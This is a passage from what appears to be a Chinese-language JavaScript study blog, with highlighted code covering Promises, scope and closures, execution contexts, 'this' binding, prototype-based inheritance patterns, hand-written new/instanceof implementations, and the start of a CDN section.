class="line">  <span class="keyword">if</span> (rand &gt; <span class="number">0.5</span>) <span class="title function_">resolve</span>();</span><br><span class="line">  <span class="keyword">else</span> <span class="title function_">reject</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p0 = <span class="keyword">new</span> <span class="title class_">Promise</span>(executor);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p1 = p0.<span class="title function_">then</span>(<span class="function">(<span class="params">value</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;succeed-1&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(executor);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p3 = p1.<span class="title function_">then</span>(<span class="function">(<span class="params">value</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;succeed-2&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(executor);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p4 = p3.<span class="title function_">then</span>(<span class="function">(<span class="params">value</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;succeed-3&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(executor);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">p4.<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<h1 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h1><p>作用域，可以说是一套储存变量，访问变量的一套规则。指的是在这规则约束下，变量，函数，标识符可访问的区域。<br>js 作用域是<code>词法作用域</code>，一种静态作用域，静态作用域是<code>代码编译阶段就决定好了，跟函数调用没有关系</code><br>有三种作用域：<br>全局作用域<br>函数作用域<br>块级作用域</p>
<h1 id="作用域链"><a href="#作用域链" class="headerlink" title="作用域链"></a>作用域链</h1><p>当作用域套作用域时，就形成了一条作用域链。<br>全局套函数<br>函数套函数<br>比如</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> b = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>作用： 可让 a 函数可以访问到外部作用的变量，查找变量时的这条链就称为作用域链</p>
<blockquote>
<p>但注意，作用域链时基于词法作用域的，也就是说作用域链的形成是代码书写阶段就已经确认下来</p>
</blockquote>
<h1 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h1><p>本质： 根据词法作用域，内部函数总是可以访问外部函数中声明的变量，当通过调用外部函数返回的内部函数时，外部执行完，但是内部函数引用外部函数的变量依然保存在内存，把这个些变量的结合称之为闭包。外部函数的闭包</p>
<h1 id="执行上下文"><a href="#执行上下文" class="headerlink" title="执行上下文"></a>执行上下文</h1><p>执行上下文，是代码的执行环境。执行上下文可分为以下：</p>
<ol>
<li>全局执行上下文：</li>
</ol>
<ul>
<li>window 对象</li>
<li>this</li>
<li>其他变量对象</li>
</ul>
<ol start="2">
<li>函数执行上下文</li>
</ol>
<ul>
<li>arguments</li>
<li>this（不固定，根据谁引用就指向谁）</li>
<li>其他活动对象</li>
</ul>
<ol start="3">
<li>eval 执行上下文</li>
</ol>
<p>分仔细还可以将执行上下文分为：</p>
<ul>
<li>变量环境 （var 等定义的变量）</li>
<li>词法环境（let、const 等定义的变量）</li>
<li>作用域链（scope）</li>
<li>this</li>
</ul>
<p>执行上下文的生命周期：<br>创建阶段：</p>
<ol>
<li>生成变量对象，安排内存</li>
<li>确认 this</li>
<li>确认作用域<br>执行阶段：</li>
<li>变量赋值</li>
</ol>
<blockquote>
<p>变量提升，也就是在全局上下文创建阶段，给变量初始化安排内存，这时并未赋值</p>
</blockquote>
<h1 id="调用栈-1"><a href="#调用栈-1" class="headerlink" title="调用栈"></a>调用栈</h1><p>先说结论，调用栈呢，是一种数据栈的数据结构管理执行上下文的，当执行环境执行多个函数时，也就是执行上下文执行调用函数时，会按顺序压入栈，执行到谁就先压入，遵循先进后出，执行完立即弹出。<br>从调用栈理解作用域：<br>我们所说，外部函数往往是访问不到内部函数的，这是为什么呢？</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(bb);</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">b</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> bb = <span class="string">&quot;a拿不到我&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">b</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">a</span>();</span><br></pre></td></tr></table></figure>

<p>调用栈的执行情况： 此时<code>b</code>位于栈顶，执行完直接弹出栈，<code>b执行上下文被销毁</code>，<code>a</code>自然是拿不到<code>bb这个处于b作用域的变量</code></p>
<h1 id="执行环境中的变量对象和活动对象"><a href="#执行环境中的变量对象和活动对象" class="headerlink" title="执行环境中的变量对象和活动对象"></a>执行环境中的变量对象和活动对象</h1><p>概念：每一个执行环境中都有一个与之关联的<code>变量对象</code>。如果这个环境是函数，那么将<code>活动对象</code>作为<code>变量对象</code>,<code>活动对象</code>最开始只包含一个变量，<code>arguments</code>对象。作用域链中的下一个比那辆对象来自外部环境<br>扩展：当执行流进入一个函数，函数的环境推入一个环境栈中，执行之后，再将环境弹出。<br>代码在一个环境中执行时，会创建变量对象的<code>作用域链</code>。作用域用途，是保证对执行环境有权访问的所有变量和函数的有序访问</p>
<h1 id="this-那些事"><a href="#this-那些事" class="headerlink" title="this 那些事"></a>this 那些事</h1><p><code>this</code>对象是在运行时基于函数的执行环境绑定的</p>
<ol>
<li><strong>默认绑定规则</strong>：<code>this</code>指向<code>window</code></li>
<li><strong>隐式绑定规则</strong>：函数被当作对象的方法调用时，<code>this</code>指向对象（谁调用就指向谁）</li>
<li><strong>显示绑定规则</strong>：<code>call</code>、<code>apply</code>、<code>bind</code>改变<code>this</code>指向</li>
</ol>
<h1 id="bind、apply、call-实现"><a href="#bind、apply、call-实现" class="headerlink" title="bind、apply、call 实现"></a>bind、apply、call 实现</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">  <span class="attr">a</span>: <span class="number">123</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params">p</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">a</span>, p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// call</span></span><br><span class="line">fn.<span class="title function_">call</span>(obj, <span class="string">&quot;wuxunyu&quot;</span>); <span class="comment">// 123,wuxunyu</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// bind</span></span><br><span class="line"><span class="keyword">const</span> fn1 = fn.<span class="title function_">bind</span>(obj);</span><br><span class="line"><span class="title function_">fn1</span>(<span class="string">&quot;wuxunyu&quot;</span>); <span class="comment">// 123, wuxunyu</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// apply</span></span><br><span class="line">fn.<span class="title function_">apply</span>(obj, [<span class="string">&quot;wuxunyu&quot;</span>]); <span class="comment">// 123, wuxunyu</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">myCall</span> = <span class="keyword">function</span> (<span class="params">context, ...arg</span>) &#123;</span><br><span class="line">  context.<span class="property">fn</span> = <span class="variable language_">this</span>;</span><br><span class="line">  context.<span class="title function_">fn</span>(...arg);</span><br><span class="line">  <span class="keyword">delete</span> context.<span class="property">fn</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">myBind</span> = <span class="keyword">function</span> (<span class="params">context, ...arg</span>) &#123;</span><br><span class="line">  context.<span class="property">fn</span> = <span class="variable language_">this</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    context.<span class="title function_">fn</span>(...arg);</span><br><span class="line">    <span class="keyword">delete</span> context.<span class="property">fn</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">myApply</span> = <span class="keyword">function</span> (<span class="params">context, arg</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="title class_">Array</span>.<span class="title function_">isArray</span>(arg)) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  context.<span class="property">fn</span> = <span class="variable language_">this</span>;</span><br><span class="line">  context.<span class="title function_">fn</span>(...arg);</span><br><span class="line">  <span class="keyword">delete</span> context.<span class="property">fn</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="原型对象和原型链"><a href="#原型对象和原型链" class="headerlink" title="原型对象和原型链"></a>原型对象和原型链</h1><ol>
<li><strong>原型对象</strong></li>
</ol>
<ul>
<li><p>概念：每一个构造函数中都有一个对象，<code>prototype</code>，称为原型对象。</p>
</li>
<li><p>构造函数、原型和实例的关系：原型对象<code>prototype</code>都包含一个指向构造函数<code>constructor</code>的指针，而实例都包含一个指向原型对象的内部指针<code>__proto__</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">SuperType</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">property</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> superType = <span class="keyword">new</span> <span class="title class_">SuperType</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(superType.<span class="property">__proto__</span> === <span class="title class_">SuperType</span>.<span class="property"><span class="keyword">prototype</span></span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="2">
<li><strong>原型链</strong><br>假设，让<code>A</code>的原型对象<code>prototype</code>等于另一个类型<code>B</code>的实例，此时<code>A</code>原型对象<code>prototype</code>将包含一个指向<code>B</code>原型的指针<code>__proto__</code>,相应的，<code>B</code>原型中也包含着一个指向另一个构造函数的指针。假如，又让<code>C</code>的原型对象<code>prototype</code>等于<code>A</code>的实例,如此层层递进，就构成了实例与原型的链条，这就是原型链的基本概念</li>
</ol>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">SuperType</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">property</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">SuperType</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">getSuperValue</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">property</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">SubType</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">subproperty</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 继承了 SuperType</span></span><br><span class="line"><span class="title class_">SubType</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">SuperType</span>();</span><br><span class="line"><span class="title class_">SubType</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">getSubValue</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">subproperty</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> instance = <span class="keyword">new</span> <span class="title class_">SubType</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(instance.<span class="title function_">getSuperValue</span>()); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20211128015555102.png" alt="image-20211128015555102"></p>
<blockquote>
<p>原型链的基本思想是利用原型让一个引用类型继承另一个引用类型的属性和方法</p>
</blockquote>
<h1 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h1><h2 id="原型链继承"><a href="#原型链继承" class="headerlink" title="原型链继承"></a>原型链继承</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Child</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = <span class="string">&quot;child&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Parent</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">eat</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Child</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Parent</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> child1 = <span class="keyword">new</span> <span class="title class_">Child</span>();</span><br><span class="line"><span class="keyword">const</span> child2 = <span class="keyword">new</span> <span class="title class_">Child</span>();</span><br><span class="line"></span><br><span class="line">child1.<span class="property">eat</span>.<span class="title function_">push</span>(<span class="number">4</span>);</span><br><span class="line">child1.<span class="property">eat</span>; <span class="comment">// [1,2,3,4]</span></span><br><span class="line">child2.<span class="property">eat</span>; <span class="comment">// [1,2,3,4]</span></span><br></pre></td></tr></table></figure>
<p>缺点: 子共用同个属性方法，同个引用类型</p>
<h2 id="借用构造函数继承"><a href="#借用构造函数继承" class="headerlink" title="借用构造函数继承"></a>借用构造函数继承</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Child</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title class_">Parent</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>); <span class="comment">// 将parent的this指向child，将parent方法转移到child</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = <span class="string">&quot;child&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Parent</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">eat</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Parent</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">getName</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> child1 = <span class="keyword">new</span> <span class="title class_">Child</span>();</span><br><span class="line"><span class="keyword">const</span> child2 = <span class="keyword">new</span> <span class="title class_">Child</span>();</span><br><span class="line">child1.<span class="property">eat</span>.<span class="title function_">push</span>(<span class="number">4</span>);</span><br><span class="line">child1.<span class="property">eat</span>; <span class="comment">// [1,2,3,4]</span></span><br><span class="line">child2.<span class="property">eat</span>; <span class="comment">// [1,2,3]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">child1.<span class="title function_">getName</span>() <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure>
<p>解决了原型链继承方法缺点<br>缺点:  子获取不到父原型上的属性方法</p>
<h2 id="组合继承"><a href="#组合继承" class="headerlink" title="组合继承"></a>组合继承</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Child</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title class_">Parent</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>); <span class="comment">// 将parent的this指向child，将parent方法转移到child</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = <span class="string">&quot;child&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Parent</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">eat</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Parent</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">getName</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Child</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Parent</span>();</span><br><span class="line"><span class="title class_">Child</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> = <span class="title class_">Child</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> child1 = <span class="keyword">new</span> <span class="title class_">Child</span>();</span><br><span class="line"><span class="keyword">const</span> child2 = <span class="keyword">new</span> <span class="title class_">Child</span>();</span><br><span class="line">child1.<span class="property">eat</span>.<span class="title function_">push</span>(<span class="number">4</span>);</span><br><span class="line">child1.<span class="property">eat</span>; <span class="comment">// [1,2,3,4]</span></span><br><span class="line">child2.<span class="property">eat</span>; <span class="comment">// [1,2,3]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">child1.<span class="title function_">getName</span>() <span class="comment">// child</span></span><br></pre></td></tr></table></figure>
<p>解决了借用构造函数获取不到父类原型上的属性方法<br>缺点: 调用了两次父类</p>
<h2 id="原型式继承"><a href="#原型式继承" class="headerlink" title="原型式继承"></a>原型式继承</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> child = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;child&#x27;</span>,</span><br><span class="line">  <span class="attr">eat</span>: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],</span><br><span class="line">  <span class="attr">getName</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> child1 = <span class="title class_">Object</span>.<span class="title function_">create</span>(child);</span><br><span class="line"><span class="keyword">const</span> child2 = <span class="title class_">Object</span>.<span class="title function_">create</span>(child);</span><br><span class="line">child1.<span class="property">eat</span>.<span class="title function_">push</span>(<span class="number">4</span>);</span><br><span class="line">child1.<span class="property">eat</span>; <span class="comment">// [1,2,3,4]</span></span><br><span class="line">child2.<span class="property">eat</span>; <span class="comment">// [1,2,3,4]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>缺点: 虽然简洁，但是同样存在引用同个引用问题</p>
<h2 id="寄生式继承"><a href="#寄生式继承" class="headerlink" title="寄生式继承"></a>寄生式继承</h2><p>与原型式差不多，只不过多了可以扩展父类的方法</p>
<h2 id="寄生组合式继承"><a href="#寄生组合式继承" class="headerlink" title="寄生组合式继承"></a>寄生组合式继承</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">.... <span class="comment">// 与组合继承一样，只不过prototype的赋值有些不同</span></span><br><span class="line"><span class="title class_">Child</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="title class_">Parent</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line"><span class="title class_">Child</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> = <span class="title class_">Child</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> child1 = <span class="keyword">new</span> <span class="title class_">Child</span>();</span><br><span class="line"><span class="keyword">const</span> child2 = <span class="keyword">new</span> <span class="title class_">Child</span>();</span><br><span class="line">child1.<span class="property">eat</span>.<span class="title function_">push</span>(<span class="number">4</span>);</span><br><span class="line">child1.<span class="property">eat</span>; <span class="comment">// [1,2,3,4]</span></span><br><span class="line">child2.<span class="property">eat</span>; <span class="comment">// [1,2,3]</span></span><br></pre></td></tr></table></figure>
<p>最优继承方式</p>
<h1 id="new-实现"><a href="#new-实现" class="headerlink" title="new 实现"></a>new 实现</h1><ol>
<li><strong>创建空对象 <code>obj</code> &#x3D; {}</strong></li>
<li><strong><code>this</code>指向新对象，并执行构造函数，并获取返回结果</strong></li>
<li><strong>设置原型链，新对象原型对象指向构造函数<code>prototype</code></strong></li>
<li><strong>判断构造函数返回结果是否为对象，是则返回，否则返回由<code>new</code>创建的对象<code>a</code></strong></li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">myNew</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> obj = &#123;&#125;;</span><br><span class="line">  <span class="keyword">const</span> constructor = [].<span class="property">shift</span>.<span class="title function_">call</span>(<span class="variable language_">arguments</span>);</span><br><span class="line">  <span class="keyword">const</span> result = constructor.<span class="title function_">apply</span>(obj, <span class="variable language_">arguments</span>); <span class="comment">// 改变构造函数中的this</span></span><br><span class="line">  obj.<span class="property">__proto__</span> = constructor.<span class="property"><span class="keyword">prototype</span></span>; <span class="comment">// obj的原型对象指向构造函数prototype</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">typeof</span> result === <span class="string">&quot;object&quot;</span> ? result : obj;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">myNew</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">a</span> = <span class="number">2323</span>;</span><br><span class="line">&#125;); <span class="comment">// &#123;a: 2323&#125;</span></span><br><span class="line"><span class="keyword">new</span> (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">a</span> = <span class="number">2323</span>;</span><br><span class="line">&#125;)(); <span class="comment">// &#123;a: 2323&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="instanceOf-实现"><a href="#instanceOf-实现" class="headerlink" title="instanceOf 实现"></a>instanceOf 实现</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">A</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"><span class="keyword">const</span> a = <span class="keyword">new</span> <span class="title function_">A</span>();</span><br><span class="line">a <span class="keyword">instanceof</span> A; <span class="comment">// true</span></span><br><span class="line">a <span class="keyword">instanceof</span> <span class="title class_">Object</span>; <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">myInstanceof</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> p = a.<span class="property">__proto__</span>;</span><br><span class="line">  <span class="keyword">while</span> (p) &#123;</span><br><span class="line">    <span class="keyword">if</span> (p === b.<span class="property"><span class="keyword">prototype</span></span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    p = p.<span class="property">__proto__</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="性能优化"><a href="#性能优化" class="headerlink" title="性能优化"></a>性能优化</h1><h2 id="如何让网络通信更快"><a href="#如何让网络通信更快" class="headerlink" title="如何让网络通信更快"></a>如何让网络通信更快</h2><h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p>CDN 全称 content delivery network，又称<code>内容分发网络</code>，CDN 有两个指标，<code>全局负载均衡</code>和<code>缓存系统</code></p>
<ol>
<li>全局负载均衡<br>用户在访问服务器的时候，首先要向 <code>DNS 服务器</code>发起请求，经过解析后返回到这个网站域名的注册服务器去解析，<code>DNS 解析服务器</code>会**解析到另外一个域名，这个域名最终指向<code> CDN 全局负载均衡服务器</code>**，然后智能的挑选一个就近的最佳节点。</li>
<li>缓存系统(命中率&amp;回源率)<ul>
<li>命中率: <code>命中缓存的次数/总请求次数</code></li>
